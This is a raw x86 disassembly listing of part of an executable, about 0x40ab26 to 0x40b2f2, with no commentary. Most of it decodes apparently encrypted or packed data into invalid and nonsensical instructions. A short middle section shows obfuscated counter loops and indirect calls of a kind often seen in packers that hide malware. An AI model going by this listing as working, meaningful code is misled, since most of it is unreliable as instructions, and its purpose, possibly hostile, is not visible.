  40ab26:	mov    ebx,DWORD PTR [eax]
  40ab28:	outs   dx,DWORD PTR ds:[esi]
  40ab29:	enter  0xee48,0xa3
  40ab2d:	test   al,0xb4
  40ab2f:	aaa    
  40ab30:	neg    cl
  40ab32:	sub    ch,BYTE PTR [eax-0x46db1f44]
  40ab38:	inc    esi
  40ab39:	adc    eax,DWORD PTR [ebx]
  40ab3b:	cmp    bl,0xd1
  40ab3e:	mov    esp,0x9906151d
  40ab43:	shl    DWORD PTR [esi-0x3c],cl
  40ab46:	jb     0x40aafc
  40ab48:	adc    al,0x4b
  40ab4a:	ja     0x40aae8
  40ab4c:	jns    0x40aaea
  40ab4e:	jns    0x40ab1b
  40ab50:	add    DWORD PTR [edx],esi
  40ab52:	fsubp  st(6),st
  40ab54:	push   ss
  40ab55:	dec    esp
  40ab56:	mov    WORD PTR [eax-0x1adad18],fs
  40ab5c:	retf   0x24b5
  40ab5f:	or     eax,0x494bc14b
  40ab64:	pop    ss
  40ab65:	adc    ecx,ecx
  40ab67:	lds    edx,FWORD PTR [esi-0x18dfc53f]
  40ab6d:	mov    bl,0x46
  40ab6f:	popf   
  40ab70:	lahf   
  40ab71:	jb     0x40ab5c
  40ab73:	mov    ds:0x1f83a083,eax
  40ab78:	aad    0x70
  40ab7a:	mov    ebp,0xdda34577
  40ab7f:	jge    0x40abd9
  40ab81:	xchg   esp,eax
  40ab82:	jecxz  0x40ab58
  40ab84:	and    esi,edi
  40ab86:	dec    ecx
  40ab87:	daa    
  40ab88:	int3   
  40ab89:	stos   BYTE PTR es:[edi],al
  40ab8a:	(bad)  
  40ab8b:	cwde   
  40ab8c:	out    dx,al
  40ab8d:	jne    0x40abf3
  40ab8f:	jl     0x40abbb
  40ab91:	int3   
  40ab92:	test   al,0xc7
  40ab94:	xchg   esi,eax
  40ab95:	push   eax
  40ab96:	sar    BYTE PTR [eax],1
  40ab98:	add    BYTE PTR [esi],ch
  40ab9a:	mov    ds:0x51814997,eax
  40ab9f:	jmp    0xa536:0x55bb7463
  40aba6:	test   bl,bl
  40aba8:	loopne 0x40aba9
  40abaa:	push   esp
  40abab:	mov    al,bh
  40abad:	dec    eax
  40abae:	sti    
  40abaf:	pusha  
  40abb0:	aam    0x87
  40abb2:	adc    bh,BYTE PTR [edi]
  40abb4:	pop    edi
  40abb5:	mov    al,0x9f
  40abb7:	jecxz  0x40ab3e
  40abb9:	cld    
  40abba:	xor    al,0xab
  40abbc:	icebp  
  40abbd:	adc    al,0xf
  40abbf:	and    bh,bl
  40abc1:	shr    BYTE PTR [ecx+0x588823ca],1
  40abc7:	mov    ecx,0x69a652f9
  40abcc:	(bad)  
  40abcd:	out    0xa9,eax
  40abcf:	jecxz  0x40abc9
  40abd1:	pop    ecx
  40abd2:	push   ebx
  40abd3:	out    dx,eax
  40abd4:	ret    0xb5d7
  40abd7:	mov    bh,0x41
  40abd9:	fadd   QWORD PTR [ecx-0x19375b52]
  40abdf:	xor    ch,BYTE PTR [eax-0x300dabf2]
  40abe5:	inc    edi
  40abe6:	js     0x40abaf
  40abe8:	imul   ebp,ebx,0xb0e0e8e0
  40abee:	mov    bh,bl
  40abf0:	pop    edx
  40abf1:	jns    0x40ac4b
  40abf3:	or     BYTE PTR [esi-0x33efa781],dh
  40abf9:	js     0x40abee
  40abfb:	jecxz  0x40aba1
  40abfd:	jp     0x40ac5a
  40abff:	cmp    dh,ch
  40ac01:	dec    eax
  40ac02:	jge    0x40ac3e
  40ac04:	dec    esi
  40ac05:	jle    0x40abde
  40ac07:	inc    eax
  40ac08:	in     al,0x1c
  40ac0a:	test   DWORD PTR [esi],edi
  40ac0c:	shl    ch,0x93
  40ac0f:	adc    DWORD PTR [edi-0x3b],0xffffffd5
  40ac13:	xor    esi,DWORD PTR [eax+0x59]
  40ac16:	mov    dh,0xb0
  40ac18:	jne    0x40aba7
  40ac1a:	lahf   
  40ac1b:	xor    al,bl
  40ac1d:	pop    esi
  40ac1e:	(bad)
  40ac21:	std    
  40ac22:	xchg   ebp,eax
  40ac23:	sub    DWORD PTR [ecx],0xb6b34743
  40ac29:	dec    ebx
  40ac2a:	iret   
  40ac2b:	cmp    edi,eax
  40ac2d:	and    DWORD PTR [ebx-0x21],esp
  40ac30:	xchg   DWORD PTR [esi-0x23050fcb],ecx
  40ac36:	cmp    eax,0xd81bc5c3
  40ac3b:	pop    ebp
  40ac3c:	push   esi
  40ac3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac3e:	loop   0x40ac63
  40ac40:	iret   
  40ac41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac42:	adc    DWORD PTR [eax],ebx
  40ac44:	pop    ebp
  40ac45:	les    ecx,FWORD PTR [ecx-0x74f61ee5]
  40ac4b:	push   edx
  40ac4c:	pop    ebx
  40ac4d:	or     ah,BYTE PTR [edx+0x72]
  40ac50:	out    dx,eax
  40ac51:	fisttp WORD PTR [eax-0x3ed5bb77]
  40ac57:	push   edi
  40ac58:	(bad)  
  40ac59:	jmp    0xe09f:0x19d60aba
  40ac60:	cmp    al,0x9
  40ac62:	mov    esp,edx
  40ac64:	arpl   WORD PTR [edx],sp
  40ac66:	imul   DWORD PTR [esi+0x5648f022]
  40ac6c:	xchg   DWORD PTR [edx+0x6dbe7162],eax
  40ac72:	call   0x7de6:0x62170bb4
  40ac79:	shr    ch,1
  40ac7b:	xchg   BYTE PTR [eax+0x674334a8],al
  40ac81:	push   ebx
  40ac82:	pop    ecx
  40ac83:	jl     0x40ac43
  40ac85:	add    BYTE PTR [ebx+0x6b4762d2],bh
  40ac8b:	hlt    
  40ac8c:	lods   al,BYTE PTR ds:[esi]
  40ac8d:	dec    edi
  40ac8e:	inc    edi
  40ac8f:	pop    esp
  40ac90:	mov    esi,0xe9ad6265
  40ac95:	add    ebx,DWORD PTR [esi+ebp*2]
  40ac98:	loopne 0x40aca0
  40ac9a:	fs test ebp,esp
  40ac9d:	repz pop esi
  40ac9f:	mov    ?,WORD PTR ds:0x48aba17d
  40aca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aca6:	icebp  
  40aca7:	ins    DWORD PTR es:[edi],dx
  40aca8:	or     al,0xdb
  40acaa:	daa    
  40acab:	pop    ebp
  40acac:	xor    dh,BYTE PTR [esi]
  40acae:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40acb0:	(bad)  
  40acb1:	ds test al,0xe6
  40acb4:	data16 xor BYTE PTR [ebx],bl
  40acb7:	test   DWORD PTR [esi+0x1beb403e],esi
  40acbd:	or     eax,0xeede771e
  40acc2:	inc    ebp
  40acc3:	mov    cl,0x15
  40acc5:	stos   BYTE PTR es:[edi],al
  40acc6:	test   eax,0x453a016c
  40accb:	adc    al,BYTE PTR [ebx-0x4ec7fbba]
  40acd1:	arpl   bp,bp
  40acd3:	jbe    0x40ad52
  40acd5:	in     eax,0x41
  40acd7:	test   al,0x8a
  40acd9:	mov    eax,DWORD PTR [ecx+0x1e]
  40acdc:	push   es
  40acdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acde:	or     al,0xec
  40ace0:	mov    ds:0x59b450a4,al
  40ace5:	inc    ebx
  40ace6:	xchg   edx,eax
  40ace7:	rcl    BYTE PTR [ecx-0x43],cl
  40acea:	(bad)  
  40aceb:	sahf   
  40acec:	rol    bl,1
  40acee:	mov    bl,0xbe
  40acf0:	dec    ebp
  40acf1:	xlat   BYTE PTR ds:[ebx]
  40acf2:	sbb    al,0xac
  40acf4:	cmp    ecx,esp
  40acf6:	mov    ch,0xef
  40acf8:	dec    edx
  40acf9:	push   edi
  40acfa:	jge    0x40ad65
  40acfc:	sahf   
  40acfd:	add    dl,BYTE PTR [edi]
  40acff:	pop    edx
  40ad00:	ficom  DWORD PTR [ebx-0x78352891]
  40ad06:	mov    bx,0x1d0c
  40ad0b:	sbb    eax,0xf3848a0d
  40ad10:	adc    DWORD PTR [esi+0x1d4ce7d6],ebp
  40ad16:	mul    DWORD PTR [ebp-0x59]
  40ad19:	push   esi
  40ad1a:	add    eax,DWORD PTR [edx-0x4b]
  40ad1d:	push   eax
  40ad1e:	xchg   edi,eax
  40ad1f:	repnz cmp al,0x34
  40ad22:	stos   BYTE PTR es:[edi],al
  40ad23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad24:	xchg   esp,eax
  40ad25:	dec    edi
  40ad26:	dec    esi
  40ad27:	icebp  
  40ad28:	or     ecx,DWORD PTR [edi-0x3b20a56b]
  40ad2e:	(bad)  
  40ad2f:	(bad)
  40ad32:	and    al,0x3c
  40ad34:	and    ebx,DWORD PTR [eax]
  40ad36:	std    
  40ad37:	popf   
  40ad38:	pop    esi
  40ad39:	mov    eax,eax
  40ad3b:	jae    0x40ad4c
  40ad3d:	and    eax,0xaeb59d7e
  40ad42:	in     al,dx
  40ad43:	sbb    DWORD PTR [edi-0x18d2548b],ebx
  40ad49:	cld    
  40ad4a:	imul   edi,DWORD PTR ds:0x4cfe93de,0xe443481b
  40ad54:	sub    al,0x47
  40ad56:	mov    fs,WORD PTR [esp+esi*8]
  40ad59:	xor    al,0x68
  40ad5b:	mov    esi,0xba3f2774
  40ad60:	addr16 push ebp
  40ad62:	outs   dx,BYTE PTR ds:[esi]
  40ad63:	mov    ecx,0x520f37d6
  40ad68:	or     al,0x80
  40ad6a:	leave  
  40ad6b:	push   ecx
  40ad6c:	add    DWORD PTR [ecx+0x15d1c172],eax
  40ad72:	ss int 0xed
  40ad75:	cli    
  40ad76:	neg    ebx
  40ad78:	xchg   edi,eax
  40ad79:	xchg   edi,eax
  40ad7a:	stos   BYTE PTR es:[edi],al
  40ad7b:	stc    
  40ad7c:	aad    0xc
  40ad7e:	cmp    BYTE PTR [ecx-0x5810a841],bh
  40ad84:	test   al,0x92
  40ad86:	test   DWORD PTR [ebp-0x5bfeb824],ebp
  40ad8c:	jl     0x40ae04
  40ad8e:	jg     0x40adc8
  40ad90:	mov    al,0x13
  40ad92:	xor    dl,BYTE PTR [ebx+0x30]
  40ad95:	test   DWORD PTR [ebp+0xb],eax
  40ad98:	sub    bl,cl
  40ad9a:	aad    0xc6
  40ad9c:	hlt    
  40ad9d:	jbe    0x40adc6
  40ad9f:	pop    ss
  40ada0:	xchg   ecx,eax
  40ada1:	pop    ss
  40ada2:	aaa    
  40ada3:	outs   dx,DWORD PTR ds:[esi]
  40ada4:	clc    
  40ada5:	ret    0x996
  40ada8:	fidiv  WORD PTR [eax-0x34]
  40adab:	ficomp WORD PTR [edi+0x5b]
  40adae:	scas   eax,DWORD PTR es:[edi]
  40adaf:	push   esi
  40adb0:	mov    eax,0x48f02bb7
  40adb5:	mov    es,WORD PTR [ecx+0x24366f5b]
  40adbb:	and    bl,ah
  40adbd:	jg     0x40ae14
  40adbf:	jmp    0xc049:0x21b3bb73
  40adc6:	out    0x88,eax
  40adc8:	push   0xffffffd3
  40adca:	jmp    0xb2e8fe50
  40adcf:	stc    
  40add0:	fcomp  DWORD PTR gs:[ebx+0x6e6372a7]
  40add7:	fisub  DWORD PTR [ecx-0x72]
  40adda:	xor    eax,0x66bc0e3f
  40addf:	sub    eax,DWORD PTR [edi+0x2594ef0c]
  40ade5:	mov    ecx,0xc354b4f
  40adea:	xchg   BYTE PTR [ecx],ah
  40adec:	jns    0x40ae25
  40adee:	xchg   dh,bh
  40adf0:	daa    
  40adf1:	xor    al,ch
  40adf3:	push   ecx
  40adf4:	push   esi
  40adf5:	imul   esi,ebx,0xffffffcf
  40adf8:	inc    ebx
  40adf9:	out    0xf,eax
  40adfb:	(bad)  
  40adfc:	jmp    0x4b52:0xd86297f2
  40ae03:	push   ds
  40ae04:	cli    
  40ae05:	jmp    0x7682814e
  40ae0a:	mov    esp,0x87f00e65
  40ae0f:	out    0x24,eax
  40ae11:	and    eax,0x3182a097
  40ae16:	mov    ecx,0xd013e2e6
  40ae1b:	fcom   QWORD PTR [esi+0x59]
  40ae1e:	jns    0x40ade7
  40ae20:	sbb    edi,DWORD PTR [ecx]
  40ae22:	loopne 0x40ae13
  40ae24:	retf   0xa709
  40ae27:	jmp    0x40ae83
  40ae29:	in     al,dx
  40ae2a:	sub    esp,DWORD PTR [ebx]
  40ae2c:	jo     0x40aded
  40ae2e:	dec    ebx
  40ae2f:	jge    0x40ae38
  40ae31:	aaa    
  40ae32:	pop    esi
  40ae33:	sub    eax,DWORD PTR [edi+0x468aa7f1]
  40ae39:	ret    0x7480
  40ae3c:	or     dl,BYTE PTR [ecx-0x14d08b1e]
  40ae42:	gs ds xchg ebx,eax
  40ae45:	cmp    ebp,DWORD PTR [ebx]
  40ae47:	mov    esi,0x3ea14178
  40ae4c:	xchg   BYTE PTR [edi+0x12b6e8e3],bl
  40ae52:	int3   
  40ae53:	cmp    BYTE PTR [edx-0x3b],ch
  40ae56:	xchg   DWORD PTR [edi+0x6],ebx
  40ae59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae5a:	fnstcw WORD PTR [ebx]
  40ae5c:	aad    0x4e
  40ae5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae5f:	xchg   edi,eax
  40ae60:	int3   
  40ae61:	sti    
  40ae62:	loope  0x40ae7a
  40ae64:	push   0x8ee6ba30
  40ae69:	mov    eax,ds:0x2b505037
  40ae6e:	xchg   edi,eax
  40ae6f:	jae    0x40aee6
  40ae71:	jmp    0x40ae7a
  40ae73:	jg     0x40aeac
  40ae75:	sub    BYTE PTR [edi],bh
  40ae77:	mov    esp,0xfb992db8
  40ae7c:	dec    ecx
  40ae7d:	push   DWORD PTR [edx]
  40ae7f:	aaa    
  40ae80:	xchg   esp,eax
  40ae81:	dec    edi
  40ae82:	and    eax,0x37cbab4c
  40ae87:	in     eax,dx
  40ae88:	test   al,0x6a
  40ae8a:	pop    eax
  40ae8b:	fcom   st(0)
  40ae8d:	jo     0x40ae47
  40ae8f:	dec    ebp
  40ae90:	cmp    edx,DWORD PTR [edi+0x5c]
  40ae93:	fsubr  st,st(7)
  40ae95:	and    BYTE PTR [ebp-0x57],bl
  40ae98:	pop    ecx
  40ae99:	popf   
  40ae9a:	mov    eax,ds:0xf9167f71
  40ae9f:	adc    BYTE PTR [edi+0x6349254e],bh
  40aea5:	out    dx,eax
  40aea6:	inc    edi
  40aea7:	popf   
  40aea8:	xchg   ecx,eax
  40aea9:	mov    ecx,0x2c155a14
  40aeae:	addr16 mov dh,0x9e
  40aeb1:	in     eax,dx
  40aeb2:	xor    al,0x72
  40aeb4:	ja     0x40af1c
  40aeb6:	mov    bh,0xe4
  40aeb8:	push   esi
  40aeb9:	pop    ebx
  40aeba:	push   edx
  40aebb:	push   ecx
  40aebc:	aad    0x1f
  40aebe:	adc    DWORD PTR [edi-0x66],edx
  40aec1:	adc    eax,0xf6049c80
  40aec6:	(bad)  
  40aec7:	cmp    ah,BYTE PTR [eax+0x34]
  40aeca:	cmp    ecx,eax
  40aecc:	in     eax,dx
  40aecd:	xchg   edx,eax
  40aece:	push   esp
  40aecf:	mov    eax,ds:0xaf0fd103
  40aed4:	xlat   BYTE PTR ds:[ebx]
  40aed5:	xor    ebx,DWORD PTR ds:0x434653
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x434647,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x43463f,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x4346ff,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43468f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x4345ef,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x43463b,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x434647,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x434647
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x434647,ebx
  40af4d:	cmp    DWORD PTR ds:0x434647,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x434647,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x434677
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43468b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434713,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434713
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434713,ebx
  40afaa:	cmp    DWORD PTR ds:0x434713,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434713,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	test   eax,0xf6900696
  40b000:	cli    
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	xchg   BYTE PTR [ecx-0x75fe3a60],bh
  40b00d:	repnz sar DWORD PTR [edx+0x2a412078],0xe5
  40b015:	test   al,0xff
  40b017:	ret    
  40b018:	mov    eax,ecx
  40b01a:	daa    
  40b01b:	or     BYTE PTR [ebp-0x6b],bh
  40b01e:	dec    esi
  40b01f:	loop   0x40b008
  40b021:	out    0xff,al
  40b023:	aas    
  40b024:	add    dl,BYTE PTR [edx]
  40b026:	fdiv   st(3),st
  40b028:	out    0x93,al
  40b02a:	push   0xffffff97
  40b02c:	jge    0x40affa
  40b02e:	sub    BYTE PTR [ebx],0x37
  40b031:	repnz inc ecx
  40b033:	or     BYTE PTR [ecx],dl
  40b035:	xor    ah,BYTE PTR [edi]
  40b037:	fcomip st,st(5)
  40b039:	inc    edx
  40b03a:	jmp    0xfd73:0x716b6b2a
  40b041:	pop    eax
  40b042:	jg     0x40afe7
  40b044:	pop    edi
  40b045:	aaa    
  40b046:	data16 mov dl,0xbc
  40b049:	stos   DWORD PTR es:[edi],eax
  40b04a:	lds    eax,FWORD PTR [ebx+eiz*4-0x6fe56482]
  40b051:	arpl   di,si
  40b053:	(bad)  
  40b055:	repz xor DWORD PTR [eax+0x42],0xc
  40b05a:	push   edi
  40b05b:	bound  edx,QWORD PTR [esi]
  40b05d:	cld    
  40b05e:	and    dh,BYTE PTR [edx+ebx*1-0x67]
  40b062:	fwait
  40b063:	adc    bh,dh
  40b065:	test   eax,0xa8ea8266
  40b06a:	test   DWORD PTR [ecx-0x6d],0xd1da7960
  40b071:	retf   
  40b072:	or     al,0xfc
  40b075:	or     edi,DWORD PTR [ecx-0x1f]
  40b078:	cmp    BYTE PTR [ebx],ah
  40b07a:	push   ebp
  40b07b:	lahf   
  40b07c:	out    dx,al
  40b07d:	mov    esp,0x6d86c674
  40b082:	stos   DWORD PTR es:[edi],eax
  40b083:	retf   0x6fba
  40b086:	mov    al,bh
  40b088:	cmc    
  40b089:	lock mov ch,0x95
  40b08c:	pusha  
  40b08d:	mov    WORD PTR [ebx-0x4e0dc666],fs
  40b093:	xor    BYTE PTR [edx+eiz*4],ch
  40b096:	enter  0xb6bc,0x9e
  40b09a:	(bad)  
  40b09b:	int    0x80
  40b09d:	(bad)  
  40b09e:	test   BYTE PTR [ebp-0x11],0xdd
  40b0a2:	ins    DWORD PTR es:[edi],dx
  40b0a3:	nop
  40b0a4:	(bad)  
  40b0a6:	sbb    DWORD PTR [edx+0x6ec9f3d3],ebp
  40b0ac:	push   0xba4bc805
  40b0b1:	sbb    bl,dh
  40b0b3:	retf   0x6052
  40b0b6:	rcl    DWORD PTR [ebx-0x1c],cl
  40b0b9:	cmc    
  40b0ba:	sbb    al,BYTE PTR [eax-0x34]
  40b0bd:	mov    esp,0x790849ed
  40b0c2:	pop    edi
  40b0c3:	dec    ecx
  40b0c4:	jl     0x40b05e
  40b0c6:	mov    bl,0xb5
  40b0c8:	adc    eax,0x2a
  40b0cb:	pop    ds
  40b0cc:	xor    eax,esi
  40b0ce:	sbb    BYTE PTR ds:0xba8dfd07,ah
  40b0d4:	out    dx,al
  40b0d5:	fisub  WORD PTR [ebp-0x22]
  40b0d8:	and    ecx,edi
  40b0da:	xchg   ecx,eax
  40b0db:	cwde   
  40b0dc:	mov    esi,0x14fb89dd
  40b0e1:	les    eax,FWORD PTR [ebp+0x47]
  40b0e4:	test   eax,0xf53e35b9
  40b0e9:	scas   eax,DWORD PTR es:[edi]
  40b0ea:	mov    ?,WORD PTR [esi]
  40b0ec:	jbe    0x40b11f
  40b0ee:	jns    0x40b152
  40b0f0:	mov    bh,0xc7
  40b0f2:	out    dx,al
  40b0f3:	or     dl,BYTE PTR [eax]
  40b0f5:	outs   dx,BYTE PTR ds:[esi]
  40b0f6:	mov    dh,BYTE PTR [edi+0x526c6508]
  40b0fc:	aaa    
  40b0fd:	jae    0x40b152
  40b0ff:	test   eax,0x2fa55308
  40b104:	push   ds
  40b105:	ret    
  40b106:	or     ah,ah
  40b108:	mov    cl,0x7e
  40b10a:	inc    esp
  40b10b:	mov    edx,ebp
  40b10d:	in     al,0x3b
  40b10f:	(bad)  
  40b110:	out    dx,al
  40b111:	mov    esp,fs
  40b113:	ja     0x40b0a1
  40b115:	sbb    ch,BYTE PTR [edx+eiz*4-0x48]
  40b119:	paddusb mm7,mm5
  40b11c:	ds dec edi
  40b11e:	xor    DWORD PTR [ecx],esp
  40b120:	ja     0x40b0bd
  40b122:	push   ecx
  40b123:	(bad)
  40b127:	adc    DWORD PTR [edi],esp
  40b129:	mov    dl,0x94
  40b12b:	xor    esp,DWORD PTR [esp+esi*8]
  40b12e:	test   BYTE PTR [edx+0x690b3d79],0xd9
  40b135:	(bad)
  40b138:	cmc    
  40b139:	mov    bh,0x2f
  40b13b:	fstp   st(7)
  40b13d:	xor    al,0xcc
  40b13f:	fild   QWORD PTR [ebp-0x6aa4941f]
  40b145:	int    0x38
  40b147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b148:	add    edi,edi
  40b14a:	jbe    0x40b0d8
  40b14c:	cli    
  40b14d:	lds    ebx,FWORD PTR [edx+0x4b22e75a]
  40b153:	out    dx,eax
  40b154:	retf   
  40b155:	xchg   edi,eax
  40b156:	mov    ecx,esp
  40b158:	arpl   WORD PTR [eax+0x349c0e0a],bx
  40b15e:	ins    DWORD PTR es:[edi],dx
  40b15f:	or     eax,0xf9bc295f
  40b164:	inc    ebp
  40b166:	mov    edx,0x7a0a0c9d
  40b16b:	push   eax
  40b16c:	sti    
  40b16d:	jp     0x40b160
  40b16f:	push   edx
  40b170:	push   es
  40b171:	ror    BYTE PTR [edx],1
  40b173:	cmp    DWORD PTR [ebp+edx*1+0x1f],esi
  40b177:	dec    ecx
  40b178:	xchg   BYTE PTR [esp+ecx*2-0x25],bl
  40b17c:	iret   
  40b17d:	mov    edx,0xed3ac3f
  40b182:	adc    BYTE PTR [ebx+0x27],al
  40b185:	fcomi  st,st(0)
  40b187:	xor    bh,BYTE PTR [ebx+edx*8+0x6]
  40b18b:	sub    eax,0x72c21f1d
  40b190:	lods   eax,DWORD PTR ds:[esi]
  40b191:	retf   
  40b192:	sub    al,0x83
  40b194:	mov    DWORD PTR [edx+0x60],esi
  40b197:	xchg   BYTE PTR [edx+ebx*2],cl
  40b19a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40b19c:	sub    ebp,edx
  40b19e:	sub    DWORD PTR ds:[esi+0x78df50dd],ebx
  40b1a5:	rcl    DWORD PTR [ebp-0x7e],cl
  40b1a8:	xlat   BYTE PTR ds:[ebx]
  40b1a9:	mov    ecx,0xbffb2b94
  40b1ae:	mov    edx,DWORD PTR [ecx-0x70]
  40b1b1:	xchg   edi,eax
  40b1b2:	jae    0x40b209
  40b1b4:	in     al,0xe5
  40b1b6:	out    0xce,al
  40b1b8:	call   0x83d:0xa5aced0f
  40b1bf:	or     DWORD PTR [edx-0x19200b34],0xffffffcf
  40b1c6:	fisttp WORD PTR [ecx+eax*4]
  40b1c9:	ja     0x40b17a
  40b1cb:	icebp  
  40b1cc:	push   ss
  40b1cd:	cdq    
  40b1ce:	ret    
  40b1cf:	cdq    
  40b1d0:	call   0x37ae27e1
  40b1d5:	lods   al,BYTE PTR ds:[esi]
  40b1d6:	mov    esi,0xa43e21d4
  40b1db:	fnstenv [edx+edi*8+0x2c]
  40b1df:	pusha  
  40b1e0:	(bad)  
  40b1e1:	jbe    0x40b1da
  40b1e3:	sub    eax,0x1540b5f
  40b1e8:	push   es
  40b1e9:	push   eax
  40b1ea:	push   DWORD PTR [edx-0x56]
  40b1ed:	(bad)  
  40b1ee:	call   0x835e3210
  40b1f3:	or     BYTE PTR [ebp+0x3a],bl
  40b1f6:	out    dx,al
  40b1f7:	(bad)  
  40b1f8:	mov    eax,0x2dfe6d58
  40b1fd:	pop    ebx
  40b1fe:	ins    DWORD PTR es:[edi],dx
  40b1ff:	gs cmp dh,cl
  40b202:	lods   al,BYTE PTR ds:[esi]
  40b203:	aad    0xac
  40b205:	mov    dl,0xe0
  40b207:	add    DWORD PTR [edi-0x555f3cf5],ebp
  40b20d:	xor    ecx,DWORD PTR [eax]
  40b20f:	popf   
  40b210:	in     al,0x82
  40b212:	cmp    eax,0x364aa3bd
  40b217:	lods   al,BYTE PTR ds:[esi]
  40b218:	or     WORD PTR ds:0xfecfb0b,di
  40b21f:	inc    ebp
  40b220:	pushf  
  40b221:	fwait
  40b222:	pop    edi
  40b223:	jne    0x40b1b7
  40b225:	dec    edx
  40b226:	mov    dh,0xc0
  40b228:	mov    BYTE PTR [edi],ah
  40b22a:	inc    edi
  40b22b:	add    edx,ecx
  40b22d:	pop    esi
  40b22e:	dec    ebx
  40b22f:	test   BYTE PTR [edx+0x72eaf7e1],dl
  40b235:	fs out dx,eax
  40b237:	ret    
  40b238:	rol    BYTE PTR ds:0xf51952fe,1
  40b23e:	pop    es
  40b23f:	pushf  
  40b240:	sbb    bh,cl
  40b242:	sbb    BYTE PTR [ebx],cl
  40b244:	and    eax,0x4ffedd41
  40b249:	xchg   edi,eax
  40b24a:	sahf   
  40b24b:	mov    BYTE PTR [eax-0x45253009],al
  40b251:	pop    ss
  40b252:	fistp  DWORD PTR [ebx+ebp*4]
  40b255:	and    al,bh
  40b257:	add    al,0x7a
  40b259:	fwait
  40b25a:	inc    esi
  40b25b:	jecxz  0x40b230
  40b25d:	pop    ebx
  40b25e:	pop    esi
  40b25f:	sahf   
  40b260:	lods   eax,DWORD PTR ds:[esi]
  40b261:	icebp  
  40b262:	or     DWORD PTR ds:0xf3c48e3f,0x1f
  40b269:	sbb    DWORD PTR [esi-0x4e],ecx
  40b26c:	mov    al,0x4e
  40b26e:	mov    ecx,DWORD PTR [edx]
  40b270:	adc    ah,BYTE PTR ds:0xc3ca52de
  40b276:	addr16 fsubp st(1),st
  40b279:	sahf   
  40b27a:	mov    DWORD PTR [ebp+0x6a47a384],0xa1aff6f1
  40b284:	jo     0x40b2f2
  40b286:	pushf  
  40b287:	push   eax
  40b288:	mov    dl,0xcd
  40b28a:	lods   eax,DWORD PTR ds:[esi]
  40b28b:	outs   dx,BYTE PTR ds:[esi]
  40b28c:	and    al,BYTE PTR [esi-0x70c46bb8]
  40b292:	rol    BYTE PTR [esi+0x48347153],1
  40b298:	xor    al,0x76
  40b29a:	pop    esp
  40b29b:	jbe    0x40b26d
  40b29d:	or     BYTE PTR [ebx-0x6c2b5ca8],0x57
  40b2a4:	and    BYTE PTR [ebx],cl
  40b2a6:	sbb    BYTE PTR [eax],al
  40b2a8:	add    eax,0xb4012cf8
  40b2ad:	mov    ds:0x84a2bb59,eax
  40b2b2:	sbb    al,0x93
  40b2b4:	in     al,0x13
  40b2b6:	pop    edi
  40b2b7:	scas   al,BYTE PTR es:[edi]
  40b2b8:	pusha  
  40b2b9:	pop    edx
  40b2ba:	xor    ebx,DWORD PTR ds:0x4a24bcc4
  40b2c0:	iret   
  40b2c1:	das    
  40b2c2:	jmp    0xc375:0x9a544522
  40b2c9:	int3   
  40b2ca:	push   0x4a4b2111
  40b2cf:	mov    WORD PTR [eax+ecx*2+0x4c93f17a],ds
  40b2d6:	dec    esp
  40b2d7:	dec    edi
  40b2d8:	ja     0x40b25e
  40b2da:	pop    esi
  40b2db:	pop    ds
  40b2dc:	(bad)  
  40b2dd:	fdivr  QWORD PTR [esi]
  40b2df:	xchg   ecx,eax
  40b2e0:	lahf   
  40b2e1:	push   esp
  40b2e2:	out    0xc5,al
  40b2e4:	rcr    BYTE PTR [edx-0x2d4feaa5],0xc7
  40b2eb:	mov    esp,0x186b7ce1
  40b2f0:	jo     0x40b33d
  40b2f2:	int3   
